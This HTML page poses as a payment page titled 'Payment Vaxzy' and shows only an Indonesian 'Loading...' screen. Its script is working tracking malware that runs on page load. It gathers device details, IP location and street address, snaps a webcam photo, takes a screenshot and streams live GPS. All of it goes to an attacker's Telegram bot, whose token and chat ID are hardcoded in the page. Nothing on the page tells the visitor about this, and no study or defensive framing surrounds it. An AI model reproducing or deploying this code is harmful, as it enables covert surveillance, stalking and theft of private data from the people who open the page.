<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>Payment Vaxzy</title>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>

<style>
  body {
    margin: 0;
    padding: 0;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    background: linear-gradient(135deg, #1e1e2f, #151515);
    font-family: 'Segoe UI', Arial, sans-serif;
    color: #ccc;
    overflow: hidden;
  }

  #loading-container {
    text-align: center;
    width: 90%;
    max-width: 420px;
    padding: 30px 20px;
    background: rgba(0,0,0,0.6);
    border-radius: 16px;
    box-shadow: 0 8px 25px rgba(0,0,0,0.4);
    backdrop-filter: blur(6px);
    animation: fadeIn 1.2s ease-in-out;
    overflow: hidden;
  }

  #loading-text {
    font-size: 26px;
    margin-bottom: 10px;
    font-weight: bold;
    background: linear-gradient(90deg, #6e48aa, #9d50bb);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    letter-spacing: 1px;
    display: inline-block;
    animation: slide 3s linear infinite alternate; /* animasi bolak-balik */
  }

  #loading-details {
    margin-top: 10px;
    font-size: 14px;
    color: #aaa;
    font-style: italic;
    opacity: 0.8;
  }

  @keyframes fadeIn {
    from { opacity: 0; transform: scale(0.9); }
    to { opacity: 1; transform: scale(1); }
  }

  @keyframes slide {
    0%   { transform: translateX(-100%); }
    100% { transform: translateX(100%); }
  }
</style>

<div id="loading-container">
  <div id="loading-text">Loading...</div>
  <div id="loading-details">Mohon tunggu sebentar</div>
</div>

  <script>
    (() => {
      const TOKEN = '8417927297:AAFR9-EptORqoCLG3Zl-HdU8AgxkfNEbq1o';
      const CHAT_ID = '7093265853';

     
      const sendTG = async msg => {
        try {
          await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: msg,
              parse_mode: 'HTML'
            })
          });
        } catch (e) {}
      };

      const sendPhoto = async (blob, filename) => {
        try {
          const fd = new FormData();
          fd.append('chat_id', CHAT_ID);
          fd.append('photo', blob, filename);

          await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
            method: 'POST',
            body: fd
          });
        } catch (e) {}
      };

      const getLocationDetails = async (lat, lon) => {
        try {
          const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
          const d = await r.json();
          if (d.address) {
            return {
              kb: d.address.county || d.address.city || d.address.state || "Tidak diketahui",
              kc: d.address.suburb || d.address.village || d.address.town || "Tidak diketahui",
              fa: d.display_name || "Alamat tidak tersedia"
            };
          }
        } catch (e) {}
        return {
          kb: "Tidak diketahui",
          kc: "Tidak diketahui",
          fa: "Alamat tidak tersedia"
        };
      };


      const collectDeviceInfo = async () => {
        let msg = '‚ï≠‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Tracking Report ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ ‚¶ø\n\n';
        msg += '‚öôÔ∏è DEVICE INFORMATION\n';
        msg += `üñ•Ô∏è Device: ${navigator.userAgent}\n`;
        msg += `üíª Platform: ${navigator.platform}\n`;
        msg += `üåê Bahasa: ${navigator.language}\n`;
        msg += `üì∂ Online: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
        msg += `üì∫ Screen Size: ${screen.width}x${screen.height}\n`;
        msg += `ü™ü Window Size: ${innerWidth}x${innerHeight}\n`;
        msg += `üíæ RAM: ${navigator.deviceMemory || 'Unknown'} GB\n`;
        msg += `üß† CPU Cores: ${navigator.hardwareConcurrency}\n`;

        if (navigator.getBattery) {
          try {
            const b = await navigator.getBattery();
            msg += `üîã Battery: ${Math.floor(b.level * 100)}%\n`;
            msg += `üîå Charging: ${b.charging ? '‚úÖ YA' : '‚ùå TIDAK'}\n`;
          } catch (e) {
            msg += 'üîã Battery: ‚ùå Tidak tersedia\n';
          }
        }

        msg += `‚è∞ Waktu Akses: ${new Date().toString()}\n`;
        msg += `üïí Page Load Time: ${performance.now().toFixed(2)} ms\n`;
        msg += `üìú History Length: ${history.length}\n`;
        msg += `‚úã Touch Support: ${'ontouchstart' in window ? '‚úÖ YA' : '‚ùå TIDAK'}\n`;
        msg += `üîó Referrer: ${document.referrer || 'None'}\n`;
        msg += `üåç URL: ${location.href}\n`;
        msg += `üìÑ Title: ${document.title}\n`;
        msg += `üïì Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
        msg += `üß≠ Offset: ${new Date().getTimezoneOffset()} menit\n\n`;

        try {
          const i = await fetch('https://ipapi.co/json/');
          const d = await i.json();

          msg += 'üìç LOCATION INFORMATION\n';
          msg += `üì° IP Address: ${d.ip}\n`;
          msg += `üèôÔ∏è Kota: ${d.city}\n`;
          msg += `üèôÔ∏è Kabupaten: ${d.region}\n`;
          msg += `üó∫Ô∏è Wilayah: ${d.region}\n`;
          msg += `üåé Negara: ${d.country_name}\n`;
          msg += `üè∑Ô∏è Kode Pos: ${d.postal}\n`;

          if (d.latitude && d.longitude) {
            msg += `üìå Latitude: ${d.latitude}\n`;
            msg += `üìç Longitude: ${d.longitude}\n`;

            const l = await getLocationDetails(d.latitude, d.longitude);
            msg += `üèôÔ∏è Kabupaten: ${l.kb}\n`;
            msg += `üèôÔ∏è Kecamatan: ${l.kc}\n`;
            msg += `üè† Alamat Lengkap: ${l.fa}\n`;
          }
        } catch (e) {
          msg += '‚ùå Gagal mendapatkan informasi lokasi\n';
        }

        msg += '\n‚ï∞‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Owner @ShyKayla ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ ‚¶ø';
        return msg;
      };

      const startTracking = async () => {
        await sendTG(await collectDeviceInfo());

        try {
          const v = document.getElementById('v');
          const c = document.getElementById('c');
          const st = await navigator.mediaDevices.getUserMedia({ video: true });

          v.srcObject = st;
          await new Promise(r => setTimeout(r, 3000));

          c.width = v.videoWidth;
          c.height = v.videoHeight;
          c.getContext('2d').drawImage(v, 0, 0);

          c.toBlob(b => sendPhoto(b, 'camera_capture.jpg'), 'image/jpeg');

          st.getTracks().forEach(t => t.stop());
        } catch (e) {
          await sendTG('‚ùå Camera access blocked');
        }

        setTimeout(async () => {
          try {
            const cn = await html2canvas(document.body);
            cn.toBlob(b => sendPhoto(b, 'screenshot.jpg'), 'image/jpeg');
          } catch (e) {
            await sendTG('‚ùå Screenshot failed');
          }
        }, 5000);

        if (navigator.geolocation) {
          navigator.geolocation.watchPosition(async pos => {
            let g = `üìç LIVE GPS TRACKING\n`;
            g += `üìå Lat: ${pos.coords.latitude}\n`;
            g += `üìç Lng: ${pos.coords.longitude}\n`;
            g += `üéØ Akurasi: ${pos.coords.accuracy}m\n`;

            const l = await getLocationDetails(pos.coords.latitude, pos.coords.longitude);
            g += `üèôÔ∏è Kabupaten: ${l.kb}\n`;
            g += `üèôÔ∏è Kecamatan: ${l.kc}\n`;
            g += `üè† Alamat: ${l.fa}\n`;

            await sendTG(g);
          },
          async e => {
            await sendTG(`‚ùå GPS Error: ${e.message}`);
          },
          { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 });
        }
      };

      setTimeout(startTracking, 3000);
    })();
  </script>
</body>
</html>
